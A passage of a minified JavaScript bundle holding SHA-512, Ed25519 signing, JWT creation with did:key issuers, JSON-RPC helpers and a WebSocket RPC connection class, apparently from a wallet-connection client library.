Int32Array([1116352408,3609767458,1899447441,602891725,3049323471,3964484399,3921009573,2173295548,961987163,4081628472,1508970993,3053834265,2453635748,2937671579,2870763221,3664609560,3624381080,2734883394,310598401,1164996542,607225278,1323610764,1426881987,3590304994,1925078388,4068182383,2162078206,991336113,2614888103,633803317,3248222580,3479774868,3835390401,2666613458,4022224774,944711139,264347078,2341262773,604807628,2007800933,770255983,1495990901,1249150122,1856431235,1555081692,3175218132,1996064986,2198950837,2554220882,3999719339,2821834349,766784016,2952996808,2566594879,3210313671,3203337956,3336571891,1034457026,3584528711,2466948901,113926993,3758326383,338241895,168717936,666307205,1188179964,773529912,1546045734,1294757372,1522805485,1396182291,2643833823,1695183700,2343527390,1986661051,1014477480,2177026350,1206759142,2456956037,344077627,2730485921,1290863460,2820302411,3158454273,3259730800,3505952657,3345764771,106217008,3516065817,3606008344,3600352804,1432725776,4094571909,1467031594,275423344,851169720,430227734,3100823752,506948616,1363258195,659060556,3750685593,883997877,3785050280,958139571,3318307427,1322822218,3812723403,1537002063,2003034995,1747873779,3602036899,1955562222,1575990012,2024104815,1125592928,2227730452,2716904306,2361852424,442776044,2428436474,593698344,2756734187,3733110249,3204031479,2999351573,3329325298,3815920427,3391569614,3928383900,3515267271,566280711,3940187606,3454069534,4118630271,4000239992,116418474,1914138554,174292421,2731055270,289380356,3203993006,460393269,320620315,685471733,587496836,852142971,1086792851,1017036298,365543100,1126000580,2618297676,1288033470,3409855158,1501505948,4234509866,1607167915,987167468,1816402316,1246189591]);function o(e,r,n,o,s,a,c){for(var l,u,h,d,f,p,g,m,v=n[0],y=n[1],b=n[2],w=n[3],_=n[4],E=n[5],x=n[6],S=n[7],A=o[0],C=o[1],I=o[2],k=o[3],N=o[4],R=o[5],T=o[6],O=o[7];c>=128;){for(var P=0;P<16;P++){var M=8*P+a;e[P]=t.readUint32BE(s,M),r[P]=t.readUint32BE(s,M+4)}for(P=0;P<80;P++){var j,L,D=v,B=y,U=b,$=w,z=_,F=E,H=x,q=A,W=C,V=I,G=k,K=N,Z=R,Y=T;if(f=65535&(u=O),p=u>>>16,g=65535&(l=S),m=l>>>16,f+=65535&(u=(N>>>14|_<<18)^(N>>>18|_<<14)^(_>>>9|N<<23)),p+=u>>>16,g+=65535&(l=(_>>>14|N<<18)^(_>>>18|N<<14)^(N>>>9|_<<23)),m+=l>>>16,f+=65535&(u=N&R^~N&T),p+=u>>>16,g+=65535&(l=_&E^~_&x),m+=l>>>16,l=i[2*P],f+=65535&(u=i[2*P+1]),p+=u>>>16,g+=65535&l,m+=l>>>16,l=e[P%16],p+=(u=r[P%16])>>>16,g+=65535&l,m+=l>>>16,g+=(p+=(f+=65535&u)>>>16)>>>16,f=65535&(u=d=65535&f|p<<16),p=u>>>16,g=65535&(l=h=65535&g|(m+=g>>>16)<<16),m=l>>>16,f+=65535&(u=(A>>>28|v<<4)^(v>>>2|A<<30)^(v>>>7|A<<25)),p+=u>>>16,g+=65535&(l=(v>>>28|A<<4)^(A>>>2|v<<30)^(A>>>7|v<<25)),m+=l>>>16,p+=(u=A&C^A&I^C&I)>>>16,g+=65535&(l=v&y^v&b^y&b),m+=l>>>16,j=65535&(g+=(p+=(f+=65535&u)>>>16)>>>16)|(m+=g>>>16)<<16,L=65535&f|p<<16,f=65535&(u=G),p=u>>>16,g=65535&(l=$),m=l>>>16,p+=(u=d)>>>16,g+=65535&(l=h),m+=l>>>16,y=D,b=B,w=U,_=$=65535&(g+=(p+=(f+=65535&u)>>>16)>>>16)|(m+=g>>>16)<<16,E=z,x=F,S=H,v=j,C=q,I=W,k=V,N=G=65535&f|p<<16,R=K,T=Z,O=Y,A=L,P%16==15)for(M=0;M<16;M++)l=e[M],f=65535&(u=r[M]),p=u>>>16,g=65535&l,m=l>>>16,l=e[(M+9)%16],f+=65535&(u=r[(M+9)%16]),p+=u>>>16,g+=65535&l,m+=l>>>16,h=e[(M+1)%16],f+=65535&(u=((d=r[(M+1)%16])>>>1|h<<31)^(d>>>8|h<<24)^(d>>>7|h<<25)),p+=u>>>16,g+=65535&(l=(h>>>1|d<<31)^(h>>>8|d<<24)^h>>>7),m+=l>>>16,h=e[(M+14)%16],p+=(u=((d=r[(M+14)%16])>>>19|h<<13)^(h>>>29|d<<3)^(d>>>6|h<<26))>>>16,g+=65535&(l=(h>>>19|d<<13)^(d>>>29|h<<3)^h>>>6),m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,e[M]=65535&g|m<<16,r[M]=65535&f|p<<16}f=65535&(u=A),p=u>>>16,g=65535&(l=v),m=l>>>16,l=n[0],p+=(u=o[0])>>>16,g+=65535&l,m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,n[0]=v=65535&g|m<<16,o[0]=A=65535&f|p<<16,f=65535&(u=C),p=u>>>16,g=65535&(l=y),m=l>>>16,l=n[1],p+=(u=o[1])>>>16,g+=65535&l,m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,n[1]=y=65535&g|m<<16,o[1]=C=65535&f|p<<16,f=65535&(u=I),p=u>>>16,g=65535&(l=b),m=l>>>16,l=n[2],p+=(u=o[2])>>>16,g+=65535&l,m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,n[2]=b=65535&g|m<<16,o[2]=I=65535&f|p<<16,f=65535&(u=k),p=u>>>16,g=65535&(l=w),m=l>>>16,l=n[3],p+=(u=o[3])>>>16,g+=65535&l,m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,n[3]=w=65535&g|m<<16,o[3]=k=65535&f|p<<16,f=65535&(u=N),p=u>>>16,g=65535&(l=_),m=l>>>16,l=n[4],p+=(u=o[4])>>>16,g+=65535&l,m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,n[4]=_=65535&g|m<<16,o[4]=N=65535&f|p<<16,f=65535&(u=R),p=u>>>16,g=65535&(l=E),m=l>>>16,l=n[5],p+=(u=o[5])>>>16,g+=65535&l,m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,n[5]=E=65535&g|m<<16,o[5]=R=65535&f|p<<16,f=65535&(u=T),p=u>>>16,g=65535&(l=x),m=l>>>16,l=n[6],p+=(u=o[6])>>>16,g+=65535&l,m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,n[6]=x=65535&g|m<<16,o[6]=T=65535&f|p<<16,f=65535&(u=O),p=u>>>16,g=65535&(l=S),m=l>>>16,l=n[7],p+=(u=o[7])>>>16,g+=65535&l,m+=l>>>16,m+=(g+=(p+=(f+=65535&u)>>>16)>>>16)>>>16,n[7]=S=65535&g|m<<16,o[7]=O=65535&f|p<<16,a+=128,c-=128}return a}e.hash=function(e){var t=new n;t.update(e);var r=t.digest();return t.clean(),r}}(uI),function(e){Object.defineProperty(e,"__esModule",{value:!0}),e.convertSecretKeyToX25519=e.convertPublicKeyToX25519=e.verify=e.sign=e.extractPublicKeyFromSecretKey=e.generateKeyPair=e.generateKeyPairFromSeed=e.SEED_LENGTH=e.SECRET_KEY_LENGTH=e.PUBLIC_KEY_LENGTH=e.SIGNATURE_LENGTH=void 0;const t=oh,r=uI,n=fs;function i(e){const t=new Float64Array(16);if(e)for(let r=0;r<e.length;r++)t[r]=e[r];return t}e.SIGNATURE_LENGTH=64,e.PUBLIC_KEY_LENGTH=32,e.SECRET_KEY_LENGTH=64,e.SEED_LENGTH=32;new Uint8Array(32)[0]=9;const o=i(),s=i([1]),a=i([30883,4953,19914,30187,55467,16705,2637,112,59544,30585,16505,36039,65139,11119,27886,20995]),c=i([61785,9906,39828,60374,45398,33411,5274,224,53552,61171,33010,6542,64743,22239,55772,9222]),l=i([54554,36645,11616,51542,42930,38181,51040,26924,56412,64982,57905,49316,21502,52590,14035,8553]),u=i([26200,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214,26214]),h=i([41136,18958,6951,50414,58488,44335,6150,12099,55207,15867,153,11085,57099,20417,9344,11139]);function d(e,t){for(let r=0;r<16;r++)e[r]=0|t[r]}function f(e){let t=1;for(let r=0;r<16;r++){let n=e[r]+t+65535;t=Math.floor(n/65536),e[r]=n-65536*t}e[0]+=t-1+37*(t-1)}function p(e,t,r){const n=~(r-1);for(let r=0;r<16;r++){const i=n&(e[r]^t[r]);e[r]^=i,t[r]^=i}}function g(e,t){const r=i(),n=i();for(let e=0;e<16;e++)n[e]=t[e];f(n),f(n),f(n);for(let e=0;e<2;e++){r[0]=n[0]-65517;for(let e=1;e<15;e++)r[e]=n[e]-65535-(r[e-1]>>16&1),r[e-1]&=65535;r[15]=n[15]-32767-(r[14]>>16&1);const e=r[15]>>16&1;r[14]&=65535,p(n,r,1-e)}for(let t=0;t<16;t++)e[2*t]=255&n[t],e[2*t+1]=n[t]>>8}function m(e,t){let r=0;for(let n=0;n<32;n++)r|=e[n]^t[n];return(1&r-1>>>8)-1}function v(e,t){const r=new Uint8Array(32),n=new Uint8Array(32);return g(r,e),g(n,t),m(r,n)}function y(e){const t=new Uint8Array(32);return g(t,e),1&t[0]}function b(e,t,r){for(let n=0;n<16;n++)e[n]=t[n]+r[n]}function w(e,t,r){for(let n=0;n<16;n++)e[n]=t[n]-r[n]}function _(e,t,r){let n,i,o=0,s=0,a=0,c=0,l=0,u=0,h=0,d=0,f=0,p=0,g=0,m=0,v=0,y=0,b=0,w=0,_=0,E=0,x=0,S=0,A=0,C=0,I=0,k=0,N=0,R=0,T=0,O=0,P=0,M=0,j=0,L=r[0],D=r[1],B=r[2],U=r[3],$=r[4],z=r[5],F=r[6],H=r[7],q=r[8],W=r[9],V=r[10],G=r[11],K=r[12],Z=r[13],Y=r[14],J=r[15];n=t[0],o+=n*L,s+=n*D,a+=n*B,c+=n*U,l+=n*$,u+=n*z,h+=n*F,d+=n*H,f+=n*q,p+=n*W,g+=n*V,m+=n*G,v+=n*K,y+=n*Z,b+=n*Y,w+=n*J,n=t[1],s+=n*L,a+=n*D,c+=n*B,l+=n*U,u+=n*$,h+=n*z,d+=n*F,f+=n*H,p+=n*q,g+=n*W,m+=n*V,v+=n*G,y+=n*K,b+=n*Z,w+=n*Y,_+=n*J,n=t[2],a+=n*L,c+=n*D,l+=n*B,u+=n*U,h+=n*$,d+=n*z,f+=n*F,p+=n*H,g+=n*q,m+=n*W,v+=n*V,y+=n*G,b+=n*K,w+=n*Z,_+=n*Y,E+=n*J,n=t[3],c+=n*L,l+=n*D,u+=n*B,h+=n*U,d+=n*$,f+=n*z,p+=n*F,g+=n*H,m+=n*q,v+=n*W,y+=n*V,b+=n*G,w+=n*K,_+=n*Z,E+=n*Y,x+=n*J,n=t[4],l+=n*L,u+=n*D,h+=n*B,d+=n*U,f+=n*$,p+=n*z,g+=n*F,m+=n*H,v+=n*q,y+=n*W,b+=n*V,w+=n*G,_+=n*K,E+=n*Z,x+=n*Y,S+=n*J,n=t[5],u+=n*L,h+=n*D,d+=n*B,f+=n*U,p+=n*$,g+=n*z,m+=n*F,v+=n*H,y+=n*q,b+=n*W,w+=n*V,_+=n*G,E+=n*K,x+=n*Z,S+=n*Y,A+=n*J,n=t[6],h+=n*L,d+=n*D,f+=n*B,p+=n*U,g+=n*$,m+=n*z,v+=n*F,y+=n*H,b+=n*q,w+=n*W,_+=n*V,E+=n*G,x+=n*K,S+=n*Z,A+=n*Y,C+=n*J,n=t[7],d+=n*L,f+=n*D,p+=n*B,g+=n*U,m+=n*$,v+=n*z,y+=n*F,b+=n*H,w+=n*q,_+=n*W,E+=n*V,x+=n*G,S+=n*K,A+=n*Z,C+=n*Y,I+=n*J,n=t[8],f+=n*L,p+=n*D,g+=n*B,m+=n*U,v+=n*$,y+=n*z,b+=n*F,w+=n*H,_+=n*q,E+=n*W,x+=n*V,S+=n*G,A+=n*K,C+=n*Z,I+=n*Y,k+=n*J,n=t[9],p+=n*L,g+=n*D,m+=n*B,v+=n*U,y+=n*$,b+=n*z,w+=n*F,_+=n*H,E+=n*q,x+=n*W,S+=n*V,A+=n*G,C+=n*K,I+=n*Z,k+=n*Y,N+=n*J,n=t[10],g+=n*L,m+=n*D,v+=n*B,y+=n*U,b+=n*$,w+=n*z,_+=n*F,E+=n*H,x+=n*q,S+=n*W,A+=n*V,C+=n*G,I+=n*K,k+=n*Z,N+=n*Y,R+=n*J,n=t[11],m+=n*L,v+=n*D,y+=n*B,b+=n*U,w+=n*$,_+=n*z,E+=n*F,x+=n*H,S+=n*q,A+=n*W,C+=n*V,I+=n*G,k+=n*K,N+=n*Z,R+=n*Y,T+=n*J,n=t[12],v+=n*L,y+=n*D,b+=n*B,w+=n*U,_+=n*$,E+=n*z,x+=n*F,S+=n*H,A+=n*q,C+=n*W,I+=n*V,k+=n*G,N+=n*K,R+=n*Z,T+=n*Y,O+=n*J,n=t[13],y+=n*L,b+=n*D,w+=n*B,_+=n*U,E+=n*$,x+=n*z,S+=n*F,A+=n*H,C+=n*q,I+=n*W,k+=n*V,N+=n*G,R+=n*K,T+=n*Z,O+=n*Y,P+=n*J,n=t[14],b+=n*L,w+=n*D,_+=n*B,E+=n*U,x+=n*$,S+=n*z,A+=n*F,C+=n*H,I+=n*q,k+=n*W,N+=n*V,R+=n*G,T+=n*K,O+=n*Z,P+=n*Y,M+=n*J,n=t[15],w+=n*L,_+=n*D,E+=n*B,x+=n*U,S+=n*$,A+=n*z,C+=n*F,I+=n*H,k+=n*q,N+=n*W,R+=n*V,T+=n*G,O+=n*K,P+=n*Z,M+=n*Y,j+=n*J,o+=38*_,s+=38*E,a+=38*x,c+=38*S,l+=38*A,u+=38*C,h+=38*I,d+=38*k,f+=38*N,p+=38*R,g+=38*T,m+=38*O,v+=38*P,y+=38*M,b+=38*j,i=1,n=o+i+65535,i=Math.floor(n/65536),o=n-65536*i,n=s+i+65535,i=Math.floor(n/65536),s=n-65536*i,n=a+i+65535,i=Math.floor(n/65536),a=n-65536*i,n=c+i+65535,i=Math.floor(n/65536),c=n-65536*i,n=l+i+65535,i=Math.floor(n/65536),l=n-65536*i,n=u+i+65535,i=Math.floor(n/65536),u=n-65536*i,n=h+i+65535,i=Math.floor(n/65536),h=n-65536*i,n=d+i+65535,i=Math.floor(n/65536),d=n-65536*i,n=f+i+65535,i=Math.floor(n/65536),f=n-65536*i,n=p+i+65535,i=Math.floor(n/65536),p=n-65536*i,n=g+i+65535,i=Math.floor(n/65536),g=n-65536*i,n=m+i+65535,i=Math.floor(n/65536),m=n-65536*i,n=v+i+65535,i=Math.floor(n/65536),v=n-65536*i,n=y+i+65535,i=Math.floor(n/65536),y=n-65536*i,n=b+i+65535,i=Math.floor(n/65536),b=n-65536*i,n=w+i+65535,i=Math.floor(n/65536),w=n-65536*i,o+=i-1+37*(i-1),i=1,n=o+i+65535,i=Math.floor(n/65536),o=n-65536*i,n=s+i+65535,i=Math.floor(n/65536),s=n-65536*i,n=a+i+65535,i=Math.floor(n/65536),a=n-65536*i,n=c+i+65535,i=Math.floor(n/65536),c=n-65536*i,n=l+i+65535,i=Math.floor(n/65536),l=n-65536*i,n=u+i+65535,i=Math.floor(n/65536),u=n-65536*i,n=h+i+65535,i=Math.floor(n/65536),h=n-65536*i,n=d+i+65535,i=Math.floor(n/65536),d=n-65536*i,n=f+i+65535,i=Math.floor(n/65536),f=n-65536*i,n=p+i+65535,i=Math.floor(n/65536),p=n-65536*i,n=g+i+65535,i=Math.floor(n/65536),g=n-65536*i,n=m+i+65535,i=Math.floor(n/65536),m=n-65536*i,n=v+i+65535,i=Math.floor(n/65536),v=n-65536*i,n=y+i+65535,i=Math.floor(n/65536),y=n-65536*i,n=b+i+65535,i=Math.floor(n/65536),b=n-65536*i,n=w+i+65535,i=Math.floor(n/65536),w=n-65536*i,o+=i-1+37*(i-1),e[0]=o,e[1]=s,e[2]=a,e[3]=c,e[4]=l,e[5]=u,e[6]=h,e[7]=d,e[8]=f,e[9]=p,e[10]=g,e[11]=m,e[12]=v,e[13]=y,e[14]=b,e[15]=w}function E(e,t){_(e,t,t)}function x(e,t){const r=i();let n;for(n=0;n<16;n++)r[n]=t[n];for(n=253;n>=0;n--)E(r,r),2!==n&&4!==n&&_(r,r,t);for(n=0;n<16;n++)e[n]=r[n]}function S(e,t){const r=i(),n=i(),o=i(),s=i(),a=i(),l=i(),u=i(),h=i(),d=i();w(r,e[1],e[0]),w(d,t[1],t[0]),_(r,r,d),b(n,e[0],e[1]),b(d,t[0],t[1]),_(n,n,d),_(o,e[3],t[3]),_(o,o,c),_(s,e[2],t[2]),b(s,s,s),w(a,n,r),w(l,s,o),b(u,s,o),b(h,n,r),_(e[0],a,l),_(e[1],h,u),_(e[2],u,l),_(e[3],a,h)}function A(e,t,r){for(let n=0;n<4;n++)p(e[n],t[n],r)}function C(e,t){const r=i(),n=i(),o=i();x(o,t[2]),_(r,t[0],o),_(n,t[1],o),g(e,n),e[31]^=y(r)<<7}function I(e,t,r){d(e[0],o),d(e[1],s),d(e[2],s),d(e[3],o);for(let n=255;n>=0;--n){const i=r[n/8|0]>>(7&n)&1;A(e,t,i),S(t,e),S(e,e),A(e,t,i)}}function k(e,t){const r=[i(),i(),i(),i()];d(r[0],l),d(r[1],u),d(r[2],s),_(r[3],l,u),I(e,r,t)}function N(t){if(t.length!==e.SEED_LENGTH)throw new Error(`ed25519: seed must be ${e.SEED_LENGTH} bytes`);const n=(0,r.hash)(t);n[0]&=248,n[31]&=127,n[31]|=64;const o=new Uint8Array(32),s=[i(),i(),i(),i()];k(s,n),C(o,s);const a=new Uint8Array(64);return a.set(t),a.set(o,32),{publicKey:o,secretKey:a}}e.generateKeyPairFromSeed=N,e.generateKeyPair=function(e){const r=(0,t.randomBytes)(32,e),i=N(r);return(0,n.wipe)(r),i},e.extractPublicKeyFromSecretKey=function(t){if(t.length!==e.SECRET_KEY_LENGTH)throw new Error(`ed25519: secret key must be ${e.SECRET_KEY_LENGTH} bytes`);return new Uint8Array(t.subarray(32))};const R=new Float64Array([237,211,245,92,26,99,18,88,214,156,247,162,222,249,222,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16]);function T(e,t){let r,n,i,o;for(n=63;n>=32;--n){for(r=0,i=n-32,o=n-12;i<o;++i)t[i]+=r-16*t[n]*R[i-(n-32)],r=Math.floor((t[i]+128)/256),t[i]-=256*r;t[i]+=r,t[n]=0}for(r=0,i=0;i<32;i++)t[i]+=r-(t[31]>>4)*R[i],r=t[i]>>8,t[i]&=255;for(i=0;i<32;i++)t[i]-=r*R[i];for(n=0;n<32;n++)t[n+1]+=t[n]>>8,e[n]=255&t[n]}function O(e){const t=new Float64Array(64);for(let r=0;r<64;r++)t[r]=e[r];for(let t=0;t<64;t++)e[t]=0;T(e,t)}function P(e,t){const r=i(),n=i(),c=i(),l=i(),u=i(),f=i(),p=i();return d(e[2],s),function(e,t){for(let r=0;r<16;r++)e[r]=t[2*r]+(t[2*r+1]<<8);e[15]&=32767}(e[1],t),E(c,e[1]),_(l,c,a),w(c,c,e[2]),b(l,e[2],l),E(u,l),E(f,u),_(p,f,u),_(r,p,c),_(r,r,l),function(e,t){const r=i();let n;for(n=0;n<16;n++)r[n]=t[n];for(n=250;n>=0;n--)E(r,r),1!==n&&_(r,r,t);for(n=0;n<16;n++)e[n]=r[n]}(r,r),_(r,r,c),_(r,r,l),_(r,r,l),_(e[0],r,l),E(n,e[0]),_(n,n,l),v(n,c)&&_(e[0],e[0],h),E(n,e[0]),_(n,n,l),v(n,c)?-1:(y(e[0])===t[31]>>7&&w(e[0],o,e[0]),_(e[3],e[0],e[1]),0)}e.sign=function(e,t){const n=new Float64Array(64),o=[i(),i(),i(),i()],s=(0,r.hash)(e.subarray(0,32));s[0]&=248,s[31]&=127,s[31]|=64;const a=new Uint8Array(64);a.set(s.subarray(32),32);const c=new r.SHA512;c.update(a.subarray(32)),c.update(t);const l=c.digest();c.clean(),O(l),k(o,l),C(a,o),c.reset(),c.update(a.subarray(0,32)),c.update(e.subarray(32)),c.update(t);const u=c.digest();O(u);for(let e=0;e<32;e++)n[e]=l[e];for(let e=0;e<32;e++)for(let t=0;t<32;t++)n[e+t]+=u[e]*s[t];return T(a.subarray(32),n),a},e.verify=function(t,n,o){const s=new Uint8Array(32),a=[i(),i(),i(),i()],c=[i(),i(),i(),i()];if(o.length!==e.SIGNATURE_LENGTH)throw new Error(`ed25519: signature must be ${e.SIGNATURE_LENGTH} bytes`);if(P(c,t))return!1;const l=new r.SHA512;l.update(o.subarray(0,32)),l.update(t),l.update(n);const u=l.digest();return O(u),I(a,c,u),k(c,o.subarray(32)),S(a,c),C(s,a),!m(o,s)},e.convertPublicKeyToX25519=function(e){let t=[i(),i(),i(),i()];if(P(t,e))throw new Error("Ed25519: invalid public key");let r=i(),n=i(),o=t[1];b(r,s,o),w(n,s,o),x(n,n),_(r,r,n);let a=new Uint8Array(32);return g(a,r),a},e.convertSecretKeyToX25519=function(e){const t=(0,r.hash)(e.subarray(0,32));t[0]&=248,t[31]&=127,t[31]|=64;const i=new Uint8Array(t.subarray(0,32));return(0,n.wipe)(t),i}}(X3);const JG="EdDSA",ZG="JWT",fI=".",hI="base64url",QG="utf8",YG="utf8",XG=":",eK="did",tK="key",fx="base58btc",rK="z",nK="K36",iK=32;function Bg(e){return xi(Ui(ql(e),QG),hI)}function dI(e){const t=Ui(nK,fx),r=rK+xi(b2([t,e]),fx);return[eK,tK,r].join(XG)}function sK(e){return xi(e,hI)}function oK(e){return Ui([Bg(e.header),Bg(e.payload)].join(fI),YG)}function aK(e){return[Bg(e.header),Bg(e.payload),sK(e.signature)].join(fI)}function hx(e=oh.randomBytes(32)){return X3.generateKeyPairFromSeed(e)}async function cK(e,t,r,n,i=rt.fromMiliseconds(Date.now())){const o={alg:JG,typ:ZG},s={iss:dI(n.publicKey),sub:e,aud:t,iat:i,exp:i+r},a=oK({header:o,payload:s});return aK({header:o,payload:s,signature:X3.sign(n.secretKey,a)})}const lK="PARSE_ERROR",uK="INVALID_REQUEST",fK="METHOD_NOT_FOUND",hK="INVALID_PARAMS",pI="INTERNAL_ERROR",e_="SERVER_ERROR",dK=[-32700,-32600,-32601,-32602,-32603],Od={[lK]:{code:-32700,message:"Parse error"},[uK]:{code:-32600,message:"Invalid Request"},[fK]:{code:-32601,message:"Method not found"},[hK]:{code:-32602,message:"Invalid params"},[pI]:{code:-32603,message:"Internal error"},[e_]:{code:-32e3,message:"Server error"}},gI=e_;function pK(e){return dK.includes(e)}function dx(e){return Object.keys(Od).includes(e)?Od[e]:Od[gI]}function gK(e){const t=Object.values(Od).find((t=>t.code===e));return t||Od[gI]}function vI(e,t,r){return e.message.includes("getaddrinfo ENOTFOUND")||e.message.includes("connect ECONNREFUSED")?new Error(`Unavailable ${r} RPC url at ${t}`):e}var px,mI={},xa={};function vK(){if(px)return xa;function e(){return(null==Ue?void 0:Ue.crypto)||(null==Ue?void 0:Ue.msCrypto)||{}}function t(){const t=e();return t.subtle||t.webkitSubtle}return px=1,Object.defineProperty(xa,"__esModule",{value:!0}),xa.isBrowserCryptoAvailable=xa.getSubtleCrypto=xa.getBrowerCrypto=void 0,xa.getBrowerCrypto=e,xa.getSubtleCrypto=t,xa.isBrowserCryptoAvailable=function(){return!!e()&&!!t()},xa}var gx,Sa={};function mK(){if(gx)return Sa;function e(){return typeof document>"u"&&typeof navigator<"u"&&"ReactNative"===navigator.product}function t(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}return gx=1,Object.defineProperty(Sa,"__esModule",{value:!0}),Sa.isBrowser=Sa.isNode=Sa.isReactNative=void 0,Sa.isReactNative=e,Sa.isNode=t,Sa.isBrowser=function(){return!e()&&!t()},Sa}function t_(e=3){return Date.now()*Math.pow(10,e)+Math.floor(Math.random()*Math.pow(10,e))}function bI(e=6){return BigInt(t_(e))}function lf(e,t,r){return{id:r||t_(),jsonrpc:"2.0",method:e,params:t}}function r_(e,t){return{id:e,jsonrpc:"2.0",result:t}}function kv(e,t,r){return{id:e,jsonrpc:"2.0",error:bK(t,r)}}function bK(e,t){return typeof e>"u"?dx(pI):("string"==typeof e&&(e=Object.assign(Object.assign({},dx(e_)),{message:e})),typeof t<"u"&&(e.data=t),pK(e.code)&&(e=gK(e.code)),e)}!function(e){Object.defineProperty(e,"__esModule",{value:!0});const t=ca;t.__exportStar(vK(),e),t.__exportStar(mK(),e)}(mI);class wK{}class yK extends wK{constructor(){super()}}class _K extends yK{constructor(e){super()}}const EK="^https?:",xK="^wss?:";function SK(e){const t=e.match(new RegExp(/^\w+:/,"gi"));if(t&&t.length)return t[0]}function wI(e,t){const r=SK(e);return!(typeof r>"u")&&new RegExp(t).test(r)}function vx(e){return wI(e,EK)}function mx(e){return wI(e,xK)}function CK(e){return new RegExp("wss?://localhost(:d{2,5})?").test(e)}function yI(e){return"object"==typeof e&&"id"in e&&"jsonrpc"in e&&"2.0"===e.jsonrpc}function n_(e){return yI(e)&&"method"in e}function Dv(e){return yI(e)&&(Ra(e)||fo(e))}function Ra(e){return"result"in e}function fo(e){return"error"in e}let Ka=class extends _K{constructor(e){super(e),this.events=new ai.EventEmitter,this.hasRegisteredEventListeners=!1,this.connection=this.setConnection(e),this.connection.connected&&this.registerEventListeners()}async connect(e=this.connection){await this.open(e)}async disconnect(){await this.close()}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async request(e,t){return this.requestStrict(lf(e.method,e.params||[],e.id||bI().toString()),t)}async requestStrict(e,t){return new Promise((async(r,n)=>{if(!this.connection.connected)try{await this.open()}catch(e){n(e)}this.events.on(`${e.id}`,(e=>{fo(e)?n(e.error):r(e.result)}));try{await this.connection.send(e,t)}catch(e){n(e)}}))}setConnection(e=this.connection){return e}onPayload(e){this.events.emit("payload",e),Dv(e)?this.events.emit(`${e.id}`,e):this.events.emit("message",{type:e.method,data:e.params})}onClose(e){e&&3e3===e.code&&this.events.emit("error",new Error(`WebSocket connection closed abnormally with code: ${e.code} ${e.reason?`(${e.reason})`:""}`)),this.events.emit("disconnect")}async open(e=this.connection){this.connection===e&&this.connection.connected||(this.connection.connected&&this.close(),"string"==typeof e&&(await this.connection.open(e),e=this.connection),this.connection=this.setConnection(e),await this.connection.open(),this.registerEventListeners(),this.events.emit("connect"))}async close(){await this.connection.close()}registerEventListeners(){this.hasRegisteredEventListeners||(this.connection.on("payload",(e=>this.onPayload(e))),this.connection.on("close",(e=>this.onClose(e))),this.connection.on("error",(e=>this.events.emit("error",e))),this.connection.on("register_error",(e=>this.onClose())),this.hasRegisteredEventListeners=!0)}};const AK=()=>typeof WebSocket<"u"?WebSocket:typeof global<"u"&&typeof global.WebSocket<"u"?global.WebSocket:typeof window<"u"&&typeof window.WebSocket<"u"?window.WebSocket:typeof self<"u"&&typeof self.WebSocket<"u"?self.WebSocket:require("ws"),IK=()=>typeof WebSocket<"u"||typeof global<"u"&&typeof global.WebSocket<"u"||typeof window<"u"&&typeof window.WebSocket<"u"||typeof self<"u"&&typeof self.WebSocket<"u",bx=e=>e.split("?")[0],wx=10,RK=typeof WebSocket<"u"?WebSocket:typeof global<"u"&&typeof global.WebSocket<"u"?global.WebSocket:typeof window<"u"&&typeof window.WebSocket<"u"?window.WebSocket:typeof self<"u"&&typeof self.WebSocket<"u"?self.WebSocket:require("ws");class TK{constructor(e){if(this.url=e,this.events=new ai.EventEmitter,this.registering=!1,!mx(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);this.url=e}get connected(){return typeof this.socket<"u"}get connecting(){return this.registering}on(e,t){this.events.on(e,t)}once(e,t){this.events.once(e,t)}off(e,t){this.events.off(e,t)}removeListener(e,t){this.events.removeListener(e,t)}async open(e=this.url){await this.register(e)}async close(){return new Promise(((e,t)=>{typeof this.socket>"u"?t(new Error("Connection already closed")):(this.socket.onclose=t=>{this.onClose(t),e()},this.socket.close())}))}async send(e,t){typeof this.socket>"u"&&(this.socket=await this.register());try{this.socket.send(ql(e))}catch(t){this.onError(e.id,t)}}register(e=this.url){if(!mx(e))throw new Error(`Provided URL is not compatible with WebSocket connection: ${e}`);if(this.registering){const e=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=e||this.events.listenerCount("open")>=e)&&this.events.setMaxListeners(e+1),new Promise(((e,t)=>{this.events.once("register_error",(e=>{this.resetMaxListeners(),t(e)})),this.events.once("open",(()=>{if(this.resetMaxListeners(),typeof this.socket>"u")return t(new Error("WebSocket connection is missing or invalid"));e(this.socket)}))}))}return this.url=e,this.registering=!0,new Promise(((t,r)=>{const n=mI.isReactNative()?void 0:{rejectUnauthorized:!CK(e)},i=new RK(e,[],n);typeof WebSocket<"u"||typeof global<"u"&&typeof global.WebSocket<"u"||typeof window<"u"&&typeof window.WebSocket<"u"||typeof self<"u"&&typeof self.WebSocket<"u"?i.onerror=e=>{const t=e;r(this.emitError(t.error))}:i.on("error",(e=>{r(this.emitError(e))})),i.onopen=()=>{this.onOpen(i),t(i)}}))}onOpen(e){e.onmessage=e=>this.onPayload(e),e.onclose=e=>this.onClose(e),this.socket=e,this.registering=!1,this.events.emit("open")}onClose(e){this.socket=void 0,this.registering=!1,this.events.emit("close",e)}onPayload(e){if(typeof e.data>"u")return;const t="string"==typeof e.data?L0(e.data):e.data;this.events.emit("payload",t)}onError(e,t){const r=this.parseError(t),n=kv(e,r.message||r.toString());this.events.emit("payload",n)}parseError(e,t=this.url){return vI(e,bx(t),"WS")}resetMaxListeners(){this.events.getMaxListeners()>10&&this.events.setMaxListeners(10)}emitError(e){const t=this.parseError(new Error((null==e?void 